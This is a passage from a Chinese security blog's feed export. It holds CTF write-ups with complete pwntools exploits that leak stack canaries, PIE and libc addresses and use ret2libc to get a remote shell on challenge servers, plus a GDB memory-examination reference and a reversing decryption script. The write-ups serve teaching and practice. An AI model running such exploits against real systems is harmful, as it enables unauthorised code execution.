class="number">7</span>)+&amp;quot;B&amp;quot;</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(&amp;quot;B&amp;quot;)</span><br><span class="line">x = p.recvline()</span><br><span class="line">val = u64(x[:-<span class="number">1</span>].ljust(<span class="number">8</span>,&amp;quot;\x00&amp;quot;))</span><br><span class="line"><span class="built_in">print</span> &amp;quot;val:&amp;quot;, <span class="built_in">hex</span>(val)</span><br><span class="line">elf_base = val - val_add</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line">p.recvuntil(&amp;quot;(<span class="built_in">len</span> <span class="keyword">is</span> <span class="number">624</span>)\n&amp;quot;)</span><br><span class="line">payload = &amp;quot;A&amp;quot; * (<span class="number">0x260</span>-<span class="number">8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += &amp;quot;\x20&amp;quot;</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt = elf_base + puts_plt_add</span><br><span class="line">puts_got = elf_base + puts_got_add</span><br><span class="line">pop_rdi = elf_base + pop_rdi_add</span><br><span class="line">start = elf_base + start_add</span><br></pre></td></tr></table></figure><h3 id="leak-libc-base-addr"><a href="#leak-libc-base-addr" class="headerlink" title="leak libc_base_addr"></a>leak libc_base_addr</h3><p>两种解决方法：</p><ul><li><p>程序调用了 puts ，也可以覆写 rip 调用 .plt.puts 输出 .got.puts 。两个函数地址需要加上 elf_base_addr 才是当前真实地址。得到 puts 真实地址，就可以计算 libc_base_addr 。</p></li><li><p>在 vul 中栈溢出，覆写到 main 的 rbp，输出并获取 main ret 的值。这个值一般指向的是 __libc_start_main+240。</p><p>经过两次 ROP，main 栈空间会变得混乱，需要结合汇编分析，或者 OD 打断点查需要溢出的长度。因为两次ROP，main 本来只执行一次的 push rbp 却执行了3次，导致栈空间混乱。下图中：黑色为正常情况下的栈空间，蓝色为两次ROP之后的栈空间结构。可以看到，main rip 顶与 vul rip 顶距离为 0x8*4 。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191217233539.png"></p><p>OD打断点，查询到的栈空间结构：</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191217234101.png"></p><p>泄露libc部分代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">0x260</span> + <span class="number">8</span>*<span class="number">5</span>-<span class="number">1</span>)+<span class="string">&quot;B&quot;</span> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">x = p.recvuntil(<span class="string">&quot;please&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> x</span><br><span class="line">main_abs = u64(x[:<span class="number">8</span>].split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = main_abs - <span class="number">0x20830</span><span class="comment">#(libc.symbols[&quot;__libc_start_main&quot;] + 240)</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main_abs)</span><br><span class="line">p.recvuntil(<span class="string">&quot;(len is 624)\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">0x260</span>-<span class="number">8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(main)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure><h3 id="get-shell-payload"><a href="#get-shell-payload" class="headerlink" title="get_shell payload"></a>get_shell payload</h3><p>ret2main或者ret2vul，输入两次payload，getshell。别忘了gadget也是要加上偏移量的，使用libc中的就将上libc偏移量，使用elf(程序本身)的就加上前面泄露的PIE。</p><p>最终EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#elf =&gt; read_note</span></span><br><span class="line"><span class="comment">#libc.so.6 =&gt; cp /lib/x86_64-linux-gnu/libc.so.6 libc.so.6</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#==================初始化加载资源===================</span></span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;114.116.54.89&quot;</span>, <span class="number">10000</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./read_note&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================IDA查询地址==================</span></span><br><span class="line">val_add = <span class="number">0xd2e</span></span><br><span class="line">main_add = <span class="number">0xd20</span></span><br><span class="line">puts_plt_add = <span class="number">0x8b0</span></span><br><span class="line">puts_got_add = <span class="number">0x202018</span></span><br><span class="line">pop_rdi_add = <span class="number">0xe03</span><span class="comment">#gadget from elf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#===================Round 1 leak canary===========</span></span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">0x260</span>-<span class="number">8</span>)+<span class="string">&quot;B&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))<span class="comment">#修复canary最低位</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;cancay:&quot;</span>, <span class="built_in">hex</span>(canary)</span><br><span class="line">x = p.recvline()</span><br><span class="line"><span class="comment">#===================Round 1 ret2main==============</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;(len is 624)\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">0x260</span>-<span class="number">8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload += <span class="string">&quot;\x20&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===================Round 2 leak PIE==============</span></span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">0x260</span>+<span class="number">7</span>)+<span class="string">&quot;B&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">x = p.recvline()</span><br><span class="line">val = u64(x[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;val:&quot;</span>, <span class="built_in">hex</span>(val)</span><br><span class="line">elf_base = val - val_add</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line">p.recvuntil(<span class="string">&quot;(len is 624)\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">0x260</span>-<span class="number">8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">&quot;\x20&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt = elf_base + puts_plt_add</span><br><span class="line">puts_got = elf_base + puts_got_add</span><br><span class="line">pop_rdi = elf_base + pop_rdi_add</span><br><span class="line">main = elf_base + main_add</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============Round 3 leak libc_base_addr==========</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">0x260</span> + <span class="number">8</span>*<span class="number">5</span>-<span class="number">1</span>)+<span class="string">&quot;B&quot;</span> </span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">x = p.recvuntil(<span class="string">&quot;please&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> x</span><br><span class="line">main_abs = u64(x[:<span class="number">8</span>].split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = main_abs - (libc.symbols[<span class="string">&quot;__libc_start_main&quot;</span>] + <span class="number">240</span>)<span class="comment">#-(libc.symbols[&quot;__libc_start_main&quot;] + 240)</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main_abs)</span><br><span class="line">p.recvuntil(<span class="string">&quot;(len is 624)\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">0x260</span>-<span class="number">8</span>) </span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload += p64(main)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">bin_abs = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">sys_abs = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============Round 4 get shell====================</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;path:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">0x260</span>-<span class="number">8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_abs)</span><br><span class="line">payload += p64(sys_abs)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.recvuntil(<span class="string">&quot;(len is 624)\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;getshell!!!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这道题目其他WP：<a href="https://blog.csdn.net/kety_gz/article/details/100516666">橘小白</a>、<a href="http://www.qfrost.com/PWN/bugku_PWN3/">qfrost</a>。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PIE </tag>
            
            <tag> Canary </tag>
            
            <tag> PIE绕过 </tag>
            
            <tag> Canary绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB中x的使用语法</title>
      <link href="archives/52e82c49/"/>
      <url>archives/52e82c49/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h2><p><code>x</code>用于在 gdb 中查看内存的内容</p><p>格式: <code>x /nuf &lt;addr&gt;</code></p><hr><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a><strong>说明</strong></h2><ul><li><p>x 是 examine 的缩写</p></li><li><p>n 表示要显示的内存单元的个数</p></li><li><p>u 表示一个地址单元的长度：</p><ul><li>b 表示单字节</li><li>h 表示双字节</li><li>w 表示四字节</li><li>g 表示八字节</li></ul></li><li><p>f 表示显示方式, 可取如下值：</p><ul><li>x 按十六进制格式显示变量</li><li>d 按十进制格式显示变量</li><li>u 按十进制格式显示无符号整型</li><li>o 按八进制格式显示变量</li><li>t 按二进制格式显示变量</li><li>a 按十六进制格式显示变量</li><li>i 指令地址格式</li><li>c 按字符格式显示变量</li><li>f 按浮点数格式显示变量</li></ul></li></ul><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p><code>x /20gx buf</code>:表示从内存地址buf读取内容，g 表示八字节，20 表示 20 个单位，x 按十六进制格式显示变量</p><p><code>x /3hu buf</code>：表示从内存地址buf读取内容，h 表示以双字节为一个单位，3 表示三个单位，u 表示十进制格式显示无符号整型</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> GDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gdb </tag>
            
            <tag> gdb调试 </tag>
            
            <tag> gdb调试命令 </tag>
            
            <tag> gdb x </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>广东外语外贸大学第三届网络安全大赛Writeup</title>
      <link href="archives/6d430184/"/>
      <url>archives/6d430184/</url>
      
        <content type="html"><![CDATA[<blockquote><p>官方WP：<a href="https://github.com/gwht/2019GWCTF/tree/master/">https://github.com/gwht/2019GWCTF/tree/master/</a></p></blockquote><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><p>是男人就下150层嘛，也就是答对150次计算题就返回 flag 嘛。这道题与 pwnable.kr 的一道题很像。题目有作答时间限制，所以用脚本跑吧。<del>可能是人品问题，跑了很多次，最好的就是回答到 147 之后就链接断了（垃圾校园网？）。</del></p><p>最终EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">p = remote(&amp;quot;<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>&amp;quot;,<span class="number">10034</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> n&amp;lt;<span class="number">150</span>:</span><br><span class="line">p.recvuntil(&amp;quot;Math problem: &amp;quot;)</span><br><span class="line">math = p.recvuntil(&amp;quot;=&amp;quot;)[:-<span class="number">2</span>]</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">eval</span>(math)))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">n += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p.sendline(&amp;quot;cat flag&amp;quot;)</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h3><p>python文件的反编译。这里使用的是工具<strong>Easy Python Decompiler</strong>，或者可以<a href="https://tool.lu/pyc/">在线python反编译</a>（可能存在重复代码bug）。</p><p>反编译得到的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Embedded file name: encode.py</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1) <span class="comment">#23</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>, <span class="string">&#x27;\x12&#x27;</span>, <span class="string">&#x27;\x1d&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;\x06&#x27;</span>, <span class="string">&#x27;\x14&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;\x1b&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\x01&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这里就是一个加密程序，逆算法就可以了。源码中的第一个 for 循环里面分两种情况（小于128、大于128）带入数据计算后，得出简化加密：<code>(input1[i] + i) % 128</code>。</p><p>第二个 for 循环中的是列表连续异或，解密时需要从尾部开始再次进行异或。</p><p>最终EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = [&amp;<span class="comment">#039;\x1f&amp;#039;, &amp;#039;\x12&amp;#039;, &amp;#039;\x1d&amp;#039;, &amp;#039;(&amp;#039;, &amp;#039;0&amp;#039;, &amp;#039;4&amp;#039;, &amp;#039;\x01&amp;#039;, &amp;#039;\x06&amp;#039;, &amp;#039;\x14&amp;#039;, &amp;#039;4&amp;#039;, &amp;#039;,&amp;#039;, &amp;#039;\x1b&amp;#039;, &amp;#039;U&amp;#039;, &amp;#039;?&amp;#039;, &amp;#039;o&amp;#039;, &amp;#039;6&amp;#039;, &amp;#039;*&amp;#039;, &amp;#039;:&amp;#039;, &amp;#039;\x01&amp;#039;, &amp;#039;D&amp;#039;, &amp;#039;;&amp;#039;, &amp;#039;%&amp;#039;, &amp;#039;\x13&amp;#039;]</span></span><br><span class="line">l = <span class="built_in">len</span>(a)</span><br><span class="line"><span class="built_in">print</span> l</span><br><span class="line">a = <span class="built_in">map</span>(<span class="built_in">ord</span>,a)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">a[i-<span class="number">1</span>] = a[i-<span class="number">1</span>]^a[i]</span><br><span class="line">code = &amp;<span class="comment">#039;&amp;#039;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">num = (a[i]-i) % <span class="number">128</span></span><br><span class="line">code += <span class="built_in">chr</span>(num)</span><br><span class="line"><span class="built_in">print</span> code</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="史上最简单的pwn"><a href="#史上最简单的pwn" class="headerlink" title="史上最简单的pwn"></a>史上最简单的pwn</h3><p>32位 C++ 编写的程序，运行（或）需要安装libc：<code>sudo aptitude -f install lib32stdc++6</code></p><p>栈溢出题目，选择的溢出变量为 s 。单单才变量信息看上去没有问题，不存在溢出。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191209160424.png"></p><p>但是后面的会将字符串中的 I 替换为 pretty。只用 I 够多就能覆写 eip。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191209160727.png"></p><p>最终EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">elf = ELF(&amp;<span class="comment">#039;./easy_pwn&amp;#039;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(&amp;<span class="comment">#039;./easy_pwn&amp;#039;)</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(&amp;quot;<span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>&amp;quot;,&amp;quot;<span class="number">10025</span>&amp;quot;)</span><br><span class="line">libc = ELF(&amp;<span class="comment">#039;./libc6-i386_2.23.so&amp;#039;)</span></span><br><span class="line">main = <span class="number">0x80492F5</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露 libc 地址</span></span><br><span class="line">ru(&amp;quot;name!\n&amp;quot;)</span><br><span class="line">pay = &amp;<span class="comment">#039;I&amp;#039;*0x10 </span></span><br><span class="line">pay += p32(elf.plt[&amp;<span class="comment">#039;puts&amp;#039;]) + p32(main) + p32(elf.got[&amp;#039;puts&amp;#039;])</span></span><br><span class="line"><span class="comment"># gdb.attach(p,&amp;quot;b *0x80490CB&amp;quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算函数 system 和字符串 /bin/sh 的地址</span></span><br><span class="line">sl(pay)</span><br><span class="line">ru(&amp;<span class="comment">#039;\n&amp;#039;)</span></span><br><span class="line">puts_addr = u32(rc(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_addr - libc.symbols[&amp;<span class="comment">#039;puts&amp;#039;]</span></span><br><span class="line">system = libc_base + libc.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line">binsh = libc_base + libc.search(&amp;quot;/<span class="built_in">bin</span>/sh\x00&amp;quot;).<span class="built_in">next</span>()</span><br><span class="line">log.warn(&amp;quot;puts_addr --&amp;gt; %s&amp;quot;,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">log.warn(&amp;quot;system --&amp;gt; %s&amp;quot;,<span class="built_in">hex</span>(system))</span><br><span class="line">log.warn(&amp;quot;binsh --&amp;gt; %s&amp;quot;,<span class="built_in">hex</span>(binsh))</span><br><span class="line">log.warn(&amp;quot;libc_base --&amp;gt; %s&amp;quot;,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ru(&amp;quot;name!\n&amp;quot;)</span><br><span class="line">pay = &amp;<span class="comment">#039;I&amp;#039;*0x10</span></span><br><span class="line">pay += p32(system) + p32(main) + p32(binsh)</span><br><span class="line"><span class="comment"># gdb.attach(p,&amp;quot;b *0x80490CB&amp;quot;)</span></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届红帽杯线上赛Writeup</title>
      <link href="archives/618c9d36/"/>
      <url>archives/618c9d36/</url>
      
